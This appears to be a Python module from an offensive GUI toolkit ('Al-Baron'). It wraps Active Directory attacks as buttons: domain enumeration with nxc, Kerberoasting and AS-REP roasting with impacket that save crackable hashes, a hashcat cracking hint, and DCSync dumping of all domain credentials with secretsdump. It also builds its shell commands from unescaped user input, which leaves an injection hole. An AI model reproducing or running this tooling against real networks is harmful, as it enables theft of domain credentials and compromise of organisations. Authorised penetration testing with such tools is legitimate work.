# language: Python, file: modules/ad.py
# Al-Baron AD Module — Kerberoasting, AS-REP, DCSync
import customtkinter as ctk
import threading
import subprocess
import os
from core.executor import ToolExecutor

class ADModule:
    def __init__(self, log_queue):
        self.log = log_queue
        self.name = "ad"
        self.executor = ToolExecutor(log_queue)
        self.domain = ""
        self.dc_ip = ""
        self.username = ""
        self.password = ""
        self._parent = None
        self.out = None

    def render(self, parent):
        self._parent = parent
        ctk.CTkLabel(parent, text="ACTIVE DIRECTORY", font=ctk.CTkFont(size=18, weight="bold"), text_color="#ffd700").pack(pady=(20, 4), padx=24, anchor="w")
        ctk.CTkLabel(parent, text="enumeration · Kerberoasting · AS-REP · DCSync", font=ctk.CTkFont(size=11), text_color="#8a8a8a").pack(pady=(0, 12), padx=24, anchor="w")

        # Credentials Config
        cfg = ctk.CTkFrame(parent, fg_color="#0d1319", corner_radius=6)
        cfg.pack(fill="x", padx=24)
        
        r1 = ctk.CTkFrame(cfg, fg_color="transparent")
        r1.pack(fill="x", padx=12, pady=6)
        self.domain_e = ctk.CTkEntry(r1, placeholder_text="domain (e.g. corp.local)", width=200, height=32, fg_color="#05080c", border_color="#1a2332")
        self.domain_e.pack(side="left", padx=(0, 6))
        self.dc_e = ctk.CTkEntry(r1, placeholder_text="DC IP", width=140, height=32, fg_color="#05080c", border_color="#1a2332")
        self.dc_e.pack(side="left", padx=(0, 6))
        self.user_e = ctk.CTkEntry(r1, placeholder_text="username", width=160, height=32, fg_color="#05080c", border_color="#1a2332")
        self.user_e.pack(side="left", padx=(0, 6))
        self.pass_e = ctk.CTkEntry(r1, placeholder_text="password", width=160, height=32, show="*", fg_color="#05080c", border_color="#1a2332")
        self.pass_e.pack(side="left")

        # Actions
        row = ctk.CTkFrame(parent, fg_color="transparent")
        row.pack(fill="x", padx=24, pady=12)
        for label, fn in [
            ("🔍 Enum Domain", self._enum),
            ("⚔ Kerberoast", self._kerberoast),
            ("⚔ AS-REP Roast", self._asrep),
            ("☢ DCSync", self._dcsync),
        ]:
            ctk.CTkButton(row, text=label, width=160, height=34, fg_color="#2b2000", hover_color="#554400", text_color="#ffd700", command=fn).pack(side="left", padx=(0, 4))

        # Output
        ctk.CTkLabel(parent, text="Output:", font=ctk.CTkFont(size=12, weight="bold"), text_color="#c8d6e5").pack(pady=(12, 4), padx=24, anchor="w")
        self.out = ctk.CTkTextbox(parent, fg_color="#05080c", text_color="#ffd700", font=ctk.CTkFont(family="Consolas", size=10), height=450)
        self.out.pack(fill="both", expand=True, padx=24, pady=(0, 24))

    def _get_creds(self):
        self.domain = self.domain_e.get().strip()
        self.dc_ip = self.dc_e.get().strip()
        self.username = self.user_e.get().strip()
        self.password = self.pass_e.get().strip()
        if not self.domain or not self.dc_ip or not self.username:
            self._safe_out("[!] Domain, DC IP, and username are required.")
            return False
        return True

    def _enum(self):
        if not self._get_creds(): return
        self.out.delete("1.0", "end")
        self._safe_out(f"[*] Enumerating {self.domain} on {self.dc_ip}...")
        
        cmd = f"nxc smb {self.dc_ip} -u '{self.username}' -p '{self.password}' -d {self.domain} --users --groups --shares"
        self.executor.run("enum", cmd)

    def _kerberoast(self):
        if not self._get_creds(): return
        self._safe_out("[*] Requesting TGS tickets (Kerberoasting)...")
        
        cmd = f"impacket-GetUserSPNs {self.domain}/{self.username}:{self.password} -dc-ip {self.dc_ip} -request -outputfile /tmp/kerb.txt"
        self.executor.run("kerb", cmd, lambda _: self._safe_out("\n[+] Tickets saved to /tmp/kerb.txt\n[*] Crack with: hashcat -m 13100 /tmp/kerb.txt /usr/share/wordlists/rockyou.txt"))

    def _asrep(self):
        if not self._get_creds(): return
        self._safe_out("[*] Requesting AS-REP hashes...")
        
        cmd = f"impacket-GetNPUsers {self.domain}/{self.username}:{self.password} -dc-ip {self.dc_ip} -request -format hashcat -outputfile /tmp/asrep.txt"
        self.executor.run("asrep", cmd, lambda _: self._safe_out("\n[+] Hashes saved to /tmp/asrep.txt"))

    def _dcsync(self):
        if not self._get_creds(): return
        self._safe_out("[*] Attempting DCSync (needs DA privileges)...")
        
        cmd = f"impacket-secretsdump {self.domain}/{self.username}:{self.password}@{self.dc_ip} -just-dc"
        self.executor.run("dcsync", cmd)

    def _safe_out(self, text):
        if not self._parent: return
        def _u():
            if self.out and self.out.winfo_exists():
                self.out.insert("end", text + "\n")
                self.out.see("end")
        self._parent.after(0, _u)
